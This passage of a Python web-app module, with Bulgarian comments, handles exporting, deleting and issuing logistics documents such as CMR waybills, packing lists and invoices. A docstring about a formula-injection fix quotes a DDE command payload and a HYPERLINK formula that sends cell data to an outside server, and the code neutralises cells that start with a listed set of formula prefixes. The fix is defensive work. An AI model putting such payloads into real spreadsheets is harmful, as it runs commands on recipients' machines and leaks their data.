    който openpyxl вътрешно ползва, за да open ги открие) ПРЕДИ да ги
    подадем на клетката — вместо да гърми, износът просто показва текста
    без невидимите символи.

    Одит (19.08.2026, информативна находка): низ над 32 767 знака (таванът
    на самия формат .xlsx) openpyxl реже МЪЛЧАЛИВО още при присвояването на
    стойността — проверено: 40 000 знака влизат в клетката като 32 767, без
    изключение и без предупреждение. Такъв низ е напълно достижим през
    Excel импорт (`/pallet/bulk-import`, `/invoice/import-items`,
    `/materials/import` приемат клетки с такъв размер) и после отива в
    изнесения файл при клиента/счетоводството НЕПЪЛЕН, без никой да
    забележи. Сега рязането е ЯВНО: остава видим маркер в самата клетка
    (получателят вижда, че текстът е отрязан, вместо да мисли, че това е
    всичко) и се записва ред в лога за диагностика."""
    if isinstance(value, str) and ILLEGAL_CHARACTERS_RE.search(value):
        value = ILLEGAL_CHARACTERS_RE.sub(" ", value)
    if isinstance(value, str) and len(value) > _XLSX_MAX_CELL_LEN:
        applog.log_warning(
            "routes_documents._xlsx_safe_value",
            "текст от %d знака е отрязан до %d при износа в Excel (ограничение "
            "на самия .xlsx формат) — първите знаци: %r"
            % (len(value), _XLSX_MAX_CELL_LEN, value[:60]))
        return value[:_XLSX_MAX_CELL_LEN - len(_XLSX_TRUNCATED_MARK)] + _XLSX_TRUNCATED_MARK
    return value


def _xlsx_safe_row(values):
    return [_xlsx_safe_value(v) for v in values]


# Одит (19.08.2026, находка №1, КРИТИЧНА): водещи символи, които Excel
# тълкува като начало на ФОРМУЛА, а не като текст. `=` е реалният вектор
# при .xlsx (потвърдено: openpyxl записва такава клетка с data_type='f',
# т.е. истинска формула); `+`, `-`, `@`, табулация и CR се добавят като
# защита в дълбочина — същият низ, отворен като CSV или в друга програма
# за електронни таблици, се изпълнява и с тях.
_XLSX_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def _xlsx_append(ws, values):
    """Одит (19.08.2026, находка №1, КРИТИЧНА — инжекция на формули):
    ЕДИНСТВЕНАТА точка, през която този модул добавя ред в изнесен
    .xlsx файл. Освен вече съществуващото чистене на контролни символи
    (`_xlsx_safe_value`, находка В2), тук неутрализираме и клетки,
    започващи със символ, който Excel тълкува като ФОРМУЛА.

    Защо е критично: свободните текстови полета се пълнят и от Excel
    ИМПОРТ (поръчки от доставчик, редове на фактура, справочник
    материали) — тоест съдържанието може да идва отвън. Преди тази
    поправка низ като `=cmd|'/c calc'!A0` (DDE) или
    `=HYPERLINK("http://…"&A1,"виж")` (изнася съседните клетки към чужд
    сървър) се записваше като ИСТИНСКА формула и се изпълняваше на
    машината на ПОЛУЧАТЕЛЯ — счетоводството, клиента или митническия
    агент, отворил файла, който сме им изпратили. Същите байтове се
    копират и в клиентските папки на споделения диск
    (`client_export.save_client_export_copy`).

    Поправката НЕ променя видимото съдържание: `quotePrefix` е точно
    механизмът, който Excel ползва за „това е текст, не формула“ —
    апострофът не се показва в клетката и не влиза в стойността при
    копиране. Задаваме и `data_type = "s"`, защото openpyxl определя
    типа при присвояването на стойността (преди да стигнем дотук)."""
    ws.append(_xlsx_safe_row(values))
    for cell in ws[ws.max_row]:
        if isinstance(cell.value, str) and cell.value.startswith(_XLSX_FORMULA_PREFIXES):
            cell.data_type = "s"
            cell.quotePrefix = True


def _warn_if_client_copy_failed(status):
    """Одит (19.08.2026, находка №26, средна): провален запис на копие в
    клиентската папка беше НЕВИДИМ за оператора — върнатата стойност се
    игнорираше и на двете места, а единствената следа беше ред в лог файла,
    който потребител на .exe никога не отваря. Свалянето през браузъра при
    това УСПЯВА, така че операторът остава убеден, че копието е и на общия
    диск (докато мрежовият път е бил недостъпен, дискът пълен или името на
    папката отказано от Windows).

    Самото сваляне НЕ се пипа — flash съобщението се показва при следващото
    зареждане на страница, точно както всички останали известия (отговорът
    тук е файл, не HTML страница, така че по-рано няма как)."""
    if status == client_export.EXPORT_FAILED:
        flash(_("Файлът се свали успешно, но копието в клиентската папка НЕ беше "
                "записано (недостъпна папка, пълен диск или отказано от системата "
                "име). Проверете настройката „Папка за клиентски копия“ в "
                "системните настройки."), "warning")


@login_required
def export_document_xlsx(doc_id):
    from openpyxl import Workbook
    from openpyxl.styles import Font

    con = get_db()
    row, data = fetch_document(con, doc_id)
    doc_type = row["doc_type"]
    title = db.DOC_TYPES.get(doc_type, {}).get("title", doc_type)
    fields, items, cols = _export_fields_and_items(doc_type, data)

    wb = Workbook()
    ws = wb.active
    ws.title = title[:31] or "Документ"

    bold = Font(bold=True)
    _xlsx_append(ws, ["%s № %s" % (title, row["number"])])
    ws.cell(row=1, column=1).font = Font(bold=True, size=14)
    _xlsx_append(ws, ["Баркод", row["barcode"]])
    ws.cell(row=2, column=1).font = bold
    ws.append([])

    # Одит (19.08.2026, находка №31): `fields` се строи 1:1 от
    # _XLSX_FIELDS[doc_type], затова ключът се възстановява с zip — така
    # знаем кои заглавни стойности са числа и трябва да отидат в клетката
    # като истинско число (виж _NUMERIC_FIELD_KEYS).
    field_keys = [key for _label, key in _XLSX_FIELDS.get(doc_type, [])]
    money_keys = _MONEY_FIELDS.get(doc_type, ())
    for (label, value), key in zip(fields, field_keys):
        numeric = None
        if key in _NUMERIC_FIELD_KEYS and key not in money_keys:
            # Одит (25.08.2026, находка №12): и заглавните числа изключват
            # отрицателните (остават текст) — същата последователност като
            # редовете по-горе и като всички суми в проекта.
            parsed = _parse_decimal(value)
            numeric = parsed if (parsed is not None and parsed >= 0) else None
        _xlsx_append(ws, [label, value if numeric is None else float(numeric)])
        ws.cell(row=ws.max_row, column=1).font = bold
        if numeric is not None:
            # Одит (03.09.2026, находка №5): същата маска и за ЗАГЛАВНИТЕ
            # числа (общо нето/бруто/обем, бруто и височина на палетната
            # карта) — иначе „Общо обем 0.0054“ на опаковъчния лист излизаше
            # в Excel като 0.005, а на бланката като 0.0054.
            ws.cell(row=ws.max_row, column=2).number_format = _QUANTITY_NUMBER_FORMAT

    if items and cols:
        ws.append([])
        header_row = ws.max_row + 1
        _xlsx_append(ws, [label for _key, label in cols])
        for c in range(1, len(cols) + 1):
            ws.cell(row=header_row, column=c).font = bold
        for it in items:
            _append_xlsx_item_row(ws, [it.get(key, "") for key, _label in cols], cols)
        totals_row = _invoice_export_totals_row(doc_type, items, cols)
        if totals_row is not None:
            _append_xlsx_item_row(ws, totals_row, cols)
            for c in range(1, len(cols) + 1):
                ws.cell(row=ws.max_row, column=c).font = bold

    for col_cells in ws.columns:
        lengths = [len(str(c.value)) for c in col_cells if c.value is not None]
        width = max(lengths) + 2 if lengths else 10
        ws.column_dimensions[col_cells[0].column_letter].width = min(max(width, 10), 50)

    buf = io.BytesIO()
    wb.save(buf)
    buf.seek(0)
    filename = _export_filename(con, doc_type, row, data, "xlsx")

    # Клиентски папки (виж client_export.py) — best-effort копие в
    # <базова папка>/<клиент>/, ако е включено в системните настройки.
    # НЕ бива да провали свалянето на файла за потребителя при грешка.
    _warn_if_client_copy_failed(
        client_export.save_client_export_status(db.get_settings(con), doc_type, data,
                                                filename, buf.getvalue()))

    return send_file(buf, as_attachment=True, download_name=filename,
                     mimetype="application/vnd.openxmlformats-officedocument"
                              ".spreadsheetml.sheet")


@login_required
def export_document_pdf(doc_id):
    """Износ на документ в PDF (бутон „Изтегли PDF“) — вижте pdf_export.py
    за пълния коментар защо е ЕДИН споделен генеричен PDF шаблон, а не 6
    pixel-perfect копия на печатните шаблони."""
    con = get_db()
    row, data = fetch_document(con, doc_id)
    doc_type = row["doc_type"]
    title = db.DOC_TYPES.get(doc_type, {}).get("title", doc_type)
    fields, items, cols = _export_fields_and_items(doc_type, data)
    totals_row = _invoice_export_totals_row(doc_type, items, cols)
    # Одит (31.08.2026, находка №8, средна): PDF износът вече показва
    # числата с ТОЧКА за десетичен знак, както печатната бланка и Excel.
    #
    # Поправката на находка №4 от седмия одит приложи fmt_num на всички
    # ПЕЧАТНИ шаблони, но пропусна pdf_export.html — там стоеше суровият
    # `{{ value }}` / `{{ it.get(key, "") }}`. Резултат за ЕДИН И СЪЩ
    # документ в три носителя: PDF показваше „2,5 / 0,144 / 1,25“, бланката
    # „2.5 / 0.144 / 1.25“, а Excel клетките числово 2.5 / 0.144 / 1.25.
    # Нормализацията става ТУК (а не в шаблона), защото точно този модул
    # знае кои ключове са числови — шаблонът е генеричен за 9 типа документи.
    fields, items, totals_row = _pdf_normalized_numbers(
        fields, items, cols, totals_row, doc_type)

    try:
        pdf_bytes = pdf_export.generate_document_pdf(
            title, row["number"], row["barcode"], fields, items, cols,
            totals_row=totals_row)
    except pdf_export.PdfBusyError:
        # Одит (25.08.2026, находка №5): „заета опашка“ е ВРЕМЕННО състояние,
        # не срив — спокойно съобщение „изчакайте и опитайте пак“, без да
        # тревожим оператора да „съобщи на администратор“ и без да е логнато
        # като грешка (PdfBusyError не минава през log_exception).
        flash(_("Точно сега се генерират други PDF файлове. Изчакайте няколко "
                "секунди и опитайте пак."), "warning")
        return redirect(url_for("view_document", doc_id=doc_id))
    except RuntimeError:
        # generate_document_pdf вече логна пълния traceback (applog, вижте
        # там) — тук потребителят вижда ясно съобщение и се връща към
        # документа вместо суров "Internal Server Error" на бял екран,
        # без никакво обяснение какво е станало или какво да опита.
        flash(_("PDF файлът не можа да се генерира за този документ. "
                "Опитайте пак — ако продължава, съобщете на администратор."),
              "error")
        return redirect(url_for("view_document", doc_id=doc_id))
    filename = _export_filename(con, doc_type, row, data, "pdf")

    # Клиентски папки (виж client_export.py) — best-effort копие, СЪЩИЯТ
    # механизъм като при Excel износа по-горе (заявка: "И двете" — важи за
    # ВСИЧКИ износи, не само Excel).
    _warn_if_client_copy_failed(
        client_export.save_client_export_status(db.get_settings(con), doc_type, data,
                                                filename, pdf_bytes))

    return send_file(io.BytesIO(pdf_bytes), as_attachment=True, download_name=filename,
                     mimetype="application/pdf")


@admin_required
def delete_document(doc_id):
    con = get_db()
    row = con.execute("SELECT doc_type, number FROM documents WHERE id = ?", (doc_id,)).fetchone()
    # Одит (12.08.2026, находка №22): преди тази поправка изтриване на
    # НЕСЪЩЕСТВУВАЩ/вече изтрит (напр. двоен клик, стар отворен таб) ID
    # показваше подвеждащото "Документът е изтрит" — все едно наистина е
    # свършило нещо. DELETE FROM ... WHERE id=? за несъществуващ ред е
    # no-op (0 засегнати реда), затова проверката е нужна изрично.
    if row is None:
        abort(404)
    con.execute("DELETE FROM documents WHERE id = ?", (doc_id,))
    con.commit()
    # Одит (находка С9): ON DELETE CASCADE изчиства document_attachments,
    # но не пипа файловете на диска — трябва изрично да ги изтрием, иначе
    # остават осиротели (виж attachments.delete_all_attachments_dir).
    attachments.delete_all_attachments_dir(doc_id)
    applog.log_audit("изтрит документ",
                     "id=%s %s №%s" % (doc_id, row["doc_type"], row["number"]))  # находка №51
    flash(_("Документът е изтрит."), "success")
    # Фактурите не се показват в „Всички документи“ — връщаме към техния
    # собствен списък, иначе изтритата фактура „изчезва в нищото“.
    if row is not None and row["doc_type"] in db.INVOICE_DOC_TYPES:
        return redirect(url_for("invoices_list"))
    return redirect(url_for("documents"))


# ---------------------------------------------------------------- generic издаване/преглед
# Замества петте почти еднакви *_new/*_preview двойки от стария app.py.
# Разликите между типовете (needs_items/embed_unload_points/success_message)
# идват от appcore.DOCUMENT_FLOWS — виж там за пълния коментар защо точно
# тези полета и защо success_message е дословен текст, не генериран.

_SENDER_LANG_FIELDS = ("sender_name", "sender_address", "sender_city", "sender_country")


def _apply_sender_lang(settings, sender_lang):
    """При ?sender_lang=en замества BG стойностите на фирмата изпращач
    (в prefill речника settings, ПРЕДИ да стигне до шаблона) с техните
    английски версии от Настройки (sender_name_en/sender_address_en/...),
    ако администраторът ги е попълнил там — виж routes_settings.py и
    templates/settings.html. Пропуска полета без попълнена английска
    версия (остават на BG стойността, вместо да се изпразнят) — така
    непопълненият превод никога не проваля попълването на формата."""
    if sender_lang != "en":
        return
    for field in _SENDER_LANG_FIELDS:
        en_value = (settings.get(field + "_en") or "").strip()
        if en_value:
            settings[field] = en_value


def _warn_if_number_already_used(con, doc_type, number, year=None,
                                 exclude_doc_id=None):
    """Предупреждава (без да блокира), ако ръчно въведеният номер на
    фактура вече е използван за същия тип документ — дублиран номер на
    счетоводен документ почти винаги е грешка при преписване, но има и
    редовни случаи (сторниране/преиздаване), затова е предупреждение, не
    забрана.

    Одит (19.08.2026, находка №42): справката вече включва и ГОДИНАТА.
    Уникалният индекс от миграция `_m005` е (doc_type, year, number) —
    номерацията се рестартира всяка календарна година — а тази проверка
    търсеше само по (doc_type, number). Резултат: същият номер в различна
    година се записваше УСПЕШНО (правилно), но операторът получаваше
    предупреждение „вече има издаден документ с номер …“, което е
    подвеждащо и обезсмисля предупреждението в очите му.

    Одит (31.08.2026, находка №20): годината вече се ПОДАВА от извикващия,
    вместо винаги да е `date.today().year`. При РЕДАКЦИЯ уникалният индекс
    важи върху ЗАПИСАНАТА година на документа (редакцията не я променя) —
    редакция на документ от 2025 г., направена през 2026 г., търсеше в
    грешната година, предупреждението мълчеше и следваше `IntegrityError`
    и (преди поправката на находка №4) пълна загуба на редакцията.

    `exclude_doc_id` изключва самия редактиран документ: без него всяко
    повторно записване със СЪЩИЯ номер би се самопредупредило.
    """
    if not number:
        return
    if year is None:
        year = date.today().year
    sql = ("SELECT 1 FROM documents WHERE doc_type = ? AND year = ? AND number = ?")
    params = [doc_type, year, number]
    if exclude_doc_id is not None:
        sql += " AND id <> ?"
        params.append(exclude_doc_id)
    row = con.execute(sql + " LIMIT 1", params).fetchone()
    if row is not None:
        flash(_("Внимание: вече има издаден документ с номер %(number)s "
                "през %(year)s г. Проверете дали номерът е верен.")
              % {"number": number, "year": year}, "warning")


def _warn_if_mixed_orders(items):
    """Предупреждава (без да блокира), ако редовете на фактура са от повече
    от една поръчка — заявка: „във фактури един номер на поръчка да бъде
    на една фактура“. Зареждането от палетна карта/Excel вече разделя по
    поръчка още при избора (виж routes_invoices._split_rows_by_po); това
    тук е последната предпазна мрежа за ръчно добавени/разбъркани редове.
    Редове без попълнен P.O NO не се броят — те не са „втора поръчка“."""
    pos = []
    for it in items or []:
        if not isinstance(it, dict):
            continue
        po = (it.get("po_no") or "").strip()
        if po and po not in pos:
            pos.append(po)
    if len(pos) > 1:
        flash(_("Внимание: фактурата съдържа редове от %(count)d различни поръчки "
                "(%(pos)s). Обичайно една фактура се издава за ЕДНА поръчка — "
                "проверете дали останалите не трябва да са на отделни фактури.")
              % {"count": len(pos), "pos": ", ".join(pos)}, "warning")


def _warn_if_negative_values(items):
    """Одит (12.08.2026, находка №3): вижте appcore.negative_item_rows —
    отрицателно количество/цена/тегло на ред се показва СУРОВО на
    бланката, но мълчаливо изчезва от изчислените суми под таблицата.
    Предупреждава (без да блокира — оператор с легитимна причина, напр.
    сторниращ ред, все пак може да продължи), за да забележи проблема
    ПРЕДИ да раздаде/изпрати документа."""
    rows = negative_item_rows(items)
    if rows:
        flash(_("Внимание: ред(ове) №%(rows)s съдържат отрицателно количество/цена/"
                "тегло. Такъв ред НЕ участва в сборовете под таблицата, но стойността "
                "му се вижда суровa на бланката — проверете дали не е печатна грешка.")
              % {"rows": ", ".join(str(r) for r in rows)}, "warning")
    # Одит (19.08.2026, находка №7, висока): вторият, по-коварен начин ред
    # да изчезне от сборовете — попълнена, но НЕразчитаема стойност (напр.
    # „1.234,56“ с разделител за хиляди). Виж appcore.unparsable_item_rows.
    unparsable = unparsable_item_rows(items)
    if unparsable:
        flash(_("Внимание: ред(ове) №%(rows)s съдържат количество/цена/тегло, което "
                "не може да бъде разчетено като число (допустими са само цифри с "
                "точка или запетая, напр. 1234.56). Такъв ред се ВИЖДА на бланката, "
                "но НЕ участва в общата сума — проверете стойностите.")
              % {"rows": ", ".join(str(r) for r in unparsable)}, "warning")


def _warn_if_suspicious_header_numbers(doc_type, data):
    """Одит (03.09.2026, находка №6): същите две проверки като за редовете,
    но върху ЗАГЛАВНИТЕ числови полета — виж appcore.
    suspicious_header_numbers. Важи за ВСИЧКИ типове, включително тези без
    редове (ЧМР), където досега нищо не проверяваше кутии 11 и 12."""
    labels = {key: label for label, key in _XLSX_FIELDS.get(doc_type, [])}
    money_keys = _MONEY_FIELDS.get(doc_type, ())
    keys = [key for key in labels if key in _NUMERIC_FIELD_KEYS and key not in money_keys]
    negative, unparsable = suspicious_header_numbers(data, keys, labels)
    if negative:
        flash(_("Внимание: полето/полетата %(fields)s съдържат отрицателна "
                "стойност. Тя се печата суровa на бланката и НЕ участва в "
                "сборовете — проверете дали не е печатна грешка.")
              % {"fields": ", ".join("„%s“" % f for f in negative)}, "warning")
    if unparsable:
        flash(_("Внимание: полето/полетата %(fields)s съдържат стойност, която "
                "не може да бъде разчетена като число (допустими са само цифри "
                "с точка или запетая, напр. 1234.56). Тя се печата буквално на "
                "бланката, а в Excel износа влиза като текст, не като число.")
              % {"fields": ", ".join("„%s“" % f for f in unparsable)}, "warning")


def _warn_if_packing_totals_mismatch(data):
    """Одит (19.08.2026, находка №8, висока): вижте
    appcore.packing_total_mismatches — четирите обобщаващи полета на
    опаковъчния лист се преписват на ръка и се печатат буквално в реда
    ОБЩО/TOTAL, без никаква проверка срещу сбора на редовете. Само
    предупреждава (общото легитимно може да включва тара)."""
    for label, typed, computed in packing_total_mismatches(data):
        flash(_("Внимание: „%(label)s“ е въведено %(typed)s, а сборът на редовете "
                "дава %(computed)s. Проверете дали не е печатна грешка — на "
                "бланката се отпечатва въведената стойност.")
              % {"label": label, "typed": typed, "computed": computed}, "warning")


def _document_new(doc_type):
    flow = DOCUMENT_FLOWS[doc_type]
    con = get_db()
    if request.method == "POST":
        data = form_data()
        if flow["needs_items"]:
            data["items"] = parse_items()
            # Одит (12.08.2026, находка №3): за ВСИЧКИ типове документи с
            # редове (не само фактурите с ръчен номер по-долу) — вижте
            # _warn_if_negative_values.
            _warn_if_negative_values(data["items"])
            if doc_type == "packing":
                _warn_if_packing_totals_mismatch(data)  # находка №8
        # Одит (03.09.2026, находка №6): заглавните числа — за ВСИЧКИ типове,
        # включително ЧМР, който изобщо няма редове и досега не се проверяваше
        # от нищо (кутия 11 „Бруто тегло“ и кутия 12 „Обем“).
        _warn_if_suspicious_header_numbers(doc_type, data)
        manual_number = None
        if flow["manual_number_field"]:
            manual_number = (data.get(flow["manual_number_field"]) or "").strip()
            # Одит (19.08.2026, находка №41): празен/само-интервален ръчен
            # номер пада обратно към АВТОМАТИЧНИЯ логистичен номер
            # („0001/2026“). Самият fallback е СЪЗНАТЕЛНО решение от
            # предишен кръг (документ без номер изобщо е по-лошо от
            # документ с вътрешен номер — виж appcore.save_document и
            # test_invoice_number_falls_back_to_generated_when_left_empty),
            # затова НЕ го променяме. Проблемът беше МЪЛЧАНИЕТО: търговска
            # фактура излизаше с вътрешен логистичен номер към клиент и
            # митница, без операторът да разбере (`required` в шаблона е
            # само браузърна проверка и „   “ я минава). Сега казваме ясно
            # какво се е случило, за да може да се поправи с редакция.
            if not manual_number:
                flash(_("Не е въведен номер на фактурата — документът получи "
                        "автоматичен вътрешен номер. Ако клиентът очаква Ваш "
                        "фактурен номер, редактирайте документа и го въведете."),
                     "warning")
            _warn_if_number_already_used(con, doc_type, manual_number)
            _warn_if_mixed_orders(data.get("items"))
        try:
            doc_id = save_document(con, doc_type, data, manual_number=manual_number)
        except db.NumberingExhaustedError as exc:
            # Одит (22.08.2026, находка №4): съобщението на самото изключение
            # обяснява ТОЧНО какво се е случило и какво да направи операторът
            # („първите 1000 поредни номера са заети — вероятно от ръчно
            # въведени номера във формата на автоматичните“). Преди това то
            # минаваше по общия клон на _handle_unexpected_error и потребителят
            # виждаше само „Възникна неочаквана грешка“, а въведеният документ
            # се губеше — с restore токена по-долу вече не се губи.
            con.rollback()
            flash(str(exc), "error")
            token = _store_preview("doc", (doc_type, data, None, None))
            return redirect("%s?restore=%s" % (request.path, token))
        except sqlite3.IntegrityError:
            # Одит (12.08.2026, находка №13): вижте db._m004_document_number_
            # unique — при вече заета база с УНИКАЛЕН индекс на
            # (doc_type, number), два едновременни опита със СЪЩИЯ ръчен
            # номер вече не могат и двата да минат тихо (предупреждението
            # по-горе само предупреждава, не блокира) — вторият гърми тук с
            # ясна грешка вместо необясним 500. con.rollback() е нужен, за
            # да не остане отворената транзакция от next_number() заклещена.
            con.rollback()
            # Одит (31.08.2026, находка №4, ВИСОКА): въведеното се ЗАПАЗВА,
            # точно както прави съседният блок за изчерпана номерация.
            #
            # Досега тук стоеше само flash + redirect(request.path) — формата
            # се връщаше ПРАЗНА. Проверено с изпълнение: издаване на втора
            # фактура със същия ръчен номер връщаше 302 без `restore=` токен,
            # а въведеното (бележки, всички редове) го нямаше в новата форма.
            # Операторът губеше напълно въведена търговска фактура заради
            # една сгрешена цифра. Този клон е ДАЛЕЧ по-честият от съседния:
            # предупреждението за зает номер само предупреждава и не блокира
            # изпращането.
            #
            # Съобщението вече не твърди, че номерът е зает „междувременно от
            # друг потребител“ — в почти всички реални случаи причината е
            # собствената повторена/сгрешена стойност, а старият текст
            # насочваше оператора да търси несъществуващ виновник.
            flash(_("Номер %s вече е зает от друг документ от същата година. "
                    "Въведеното е запазено — променете номера и опитайте пак.")
                  % (manual_number or data.get("number", "")), "error")
            # Всеки doc_type endpoint обработва И GET (форма), И POST
            # (запис) на СЪЩИЯ адрес (виж register() по-долу) — request.path
            # връща операторa обратно към формата за същия тип документ.
            token = _store_preview("doc", (doc_type, data, None, None))
            return redirect("%s?restore=%s" % (request.path, token))
        except Exception as exc:
            # Одит (03.09.2026, находка №13): последна мрежа — ВСЯКА друга
            # грешка при записа също запазва въведеното, вместо да го
            # изхвърли през общия обработчик. Точният повод: при трайно
            # заета база `db.next_number` изчерпва опитите си и хвърля
            # `RuntimeError` с полезно съобщение („базата е заета от друг
            # едновременен запис — опитайте отново“). То не е `sqlite3.*`,
            # затова не се разпознаваше нито тук, нито от
            # `_is_db_unavailable_error`, и заявката падаше в общия клон:
            # „Възникна неочаквана грешка“ + пренасочване, а въведеното
            # изчезваше. Проверено с изпълнение: чужд писателски катинар,
            # държан над две минути (миграции на друга машина, антивирус
            # върху мрежовия дял) → 302 без `restore=`, 0 записани
            # документа, попълнено ЧМР загубено. Груповото издаване
            # (pallet_bulk_issue) отдавна има точно такъв клон; единичното
            # издаване — не.
            con.rollback()
            applog.log_exception(
                "routes_documents: неуспешен запис на %s — въведеното е запазено"
                % doc_type)
            flash(_("Документът НЕ можа да бъде записан (%(reason)s). Въведеното "
                    "е запазено — опитайте отново след няколко секунди.")
                  % {"reason": str(exc)[:200]}, "error")
            token = _store_preview("doc", (doc_type, data, None, None))
            return redirect("%s?restore=%s" % (request.path, token))
        # Одит (19.08.2026, находка №13): шаблонът се вади в променлива,
        # преди да влезе в _(). Ако литералът "success_message" стои
        # директно вътре в _(...), `pybabel extract` го приема за
        # преводим низ и в каталозите се появява безсмислен msgid
        # "success_message". Самите текстове се извличат от appcore чрез
        # N_() маркера (виж DOCUMENT_FLOWS там).
        success_template = flow["success_message"]
        flash(_(success_template) % data["number"], "success")
        return redirect(url_for("view_document", doc_id=doc_id))
    # Одит (19.08.2026, находка №25): вграждат се най-много CLIENT_EMBED_LIMIT
    # клиента (при типична адресна книга — тоест всички); над този праг
    # останалите се намират през сървърното търсене /clients/lookup, вместо
    # формата да носи ~2 MB HTML при всяко отваряне.
    clients = load_clients(con, CLIENT_EMBED_LIMIT)
    clients_total = count_clients(con)
    settings = db.get_settings(con)
    # Подразбирането зависи от типа документ (appcore.DOCUMENT_FLOWS
    # ["default_sender_lang"]) — "bg" за повечето документи, но "en" за
    # трите фактури (заявка: „опция за изпращач Bg/EN, подразбиране да е
    # английски“). ?sender_lang=bg|en от бутона sender_lang_toggle надделява
    # над подразбирането, каквото и да е то.
    requested_lang = request.args.get("sender_lang")
    sender_lang = requested_lang if requested_lang in ("bg", "en") else flow["default_sender_lang"]
    _apply_sender_lang(settings, sender_lang)

    # Възстановяване на въведените данни след „Предварителен преглед" →
    # „Назад към формата" (виж _macros.doc_toolbar/app.preview_document) —
    # ?restore=<token> сочи към същия временен _preview_store запис, който
    # прегледът вече е показал. Пренаизползва СЪЩИЯ edit_data/data-edit/
    # prefillForm() механизъм като редакция на вече издаден документ, само
    # че БЕЗ edit_doc — това си остава истинско издаване на НОВ документ,
    # просто с предварително попълнени полета.
    restore_data = None
    restore_token = request.args.get("restore")
    if restore_token:
        payload = _get_preview(restore_token, "doc")
        if payload is not None and payload[0] == doc_type:
            restore_data = payload[1]
        else:
            # Одит (03.09.2026, находка №7): огледално на edit_document
            # по-горе. Поправката на находка №31 от 16.08 стигна само до
            # РЕДАКЦИЯТА — при издаване на НОВ документ клонът беше без
            # `else` и формата се рендираше празна, без нито дума. Токенът
            # изчезва по три напълно битови причини: изтичане (30 мин.),
            # рестарт на процеса (хранилището е в паметта — при
            # автоматично обновяване това става само́) и изхвърляне по брой
            # (_PREVIEW_MAX_ENTRIES). Тоест цяла попълнена фактура с
            # десетки редове изчезваше безмълвно по препоръчания поток
            # „попълни → преглед → назад → издай“.
            flash(_("Данните от предварителния преглед вече не са налични "
                    "(изтекъл линк) — формата е празна, въведете ги наново."),
                  "warning")

    if flow["embed_unload_points"]:
        cj = clients_json(clients, con)  # con все още отворен — вгражда unload_points
        ctx = {"clients": clients, "clients_json": cj, "s": settings, "sender_lang": sender_lang}
    else:
        ctx = {"clients": clients, "clients_json": clients_json(clients), "s": settings,
               "sender_lang": sender_lang}
    # Одит (19.08.2026, находка №25): общият брой клиенти отива към
    # формата, за да знае JavaScript-ът дали вграденият списък е ПЪЛЕН, или
    # трябва да предложи сървърно търсене — виж bindClientSelect в app.js и
    # appcore.CLIENT_EMBED_LIMIT.
    ctx["clients_total"] = clients_total
    if flow["needs_items"]:
        ctx["items"] = restore_data.get("items", []) if restore_data else []
    if flow["invoice_clients"]:
        # Одит (05.09.2026, находка №12): вграждат се първите EMBED_LIMIT
        # записа (при типична инсталация — всичките), а останалите се
        # намират през /invoices/clients/lookup.
        ctx["invoice_clients"] = invoice_clients_module.load_all(
            con, limit=invoice_clients_module.EMBED_LIMIT)
        ctx["invoice_clients_total"] = invoice_clients_module.count_all(con)
        ctx["invoice_clients_json"] = invoice_clients_module.as_json(con)
    if restore_data is not None:
        ctx["edit_data"] = restore_data
    return render_template(flow["form_template"], **ctx)


def _document_preview(doc_type):
    flow = DOCUMENT_FLOWS[doc_type]
    # Заявка: „при връщане назад от преглед за печат въведената информация
    # се губи“ — виж appcore.render_preview за пълното обяснение. Скритото
    # поле „edit_doc_id“ (само в edit_doc_id ветвите на формите) идва
    # ПРАЗНО при издаване на нов документ.
    edit_doc_id_raw = (request.form.get("edit_doc_id") or "").strip()
    edit_doc_id = int(edit_doc_id_raw) if edit_doc_id_raw.isdigit() else None
    # Одит (19.08.2026, находка №10): версията пътува през прегледа, за да
    # не се „презарежда“ оптимистичното заключване при връщане към формата.
    version_raw = (request.form.get("edit_doc_version") or "").strip()
    edit_doc_version = int(version_raw) if version_raw.isdigit() else None
    data = form_data()
    if flow["needs_items"]:
        data["items"] = parse_items()
    return render_preview(doc_type, data, edit_doc_id=edit_doc_id,
                          edit_doc_version=edit_doc_version)


# ---------------------------------------------------------------- ЧМР

@login_required
def cmr_new():
    return _document_new("cmr")


@login_required
def cmr_preview():
    return _document_preview("cmr")


# ---------------------------------------------------------------- Опаковъчен лист

@login_required
def packing_new():
    return _document_new("packing")


@login_required
def packing_preview():
    return _document_preview("packing")


# ---------------------------------------------------------------- Палетна карта

@login_required
def pallet_new():
    return _document_new("pallet")


@login_required
def pallet_preview():
    return _document_preview("pallet")


# ---------------------------------------------------------------- Товарителница (вътрешен превоз)

@login_required
def waybill_new():
    return _document_new("waybill")


@login_required
def waybill_preview():
    return _document_preview("waybill")


# ---------------------------------------------------------------- Декларация за двойна употреба

@login_required
def dualuse_new():
    return _document_new("dualuse")


@login_required
def dualuse_preview():
    return _document_preview("dualuse")


# ---------------------------------------------------------------- Декларация за износ (Италия)

@login_required
def export_it_new():
    return _document_new("export_it")


@login_required
def export_it_preview():
    return _document_preview("export_it")
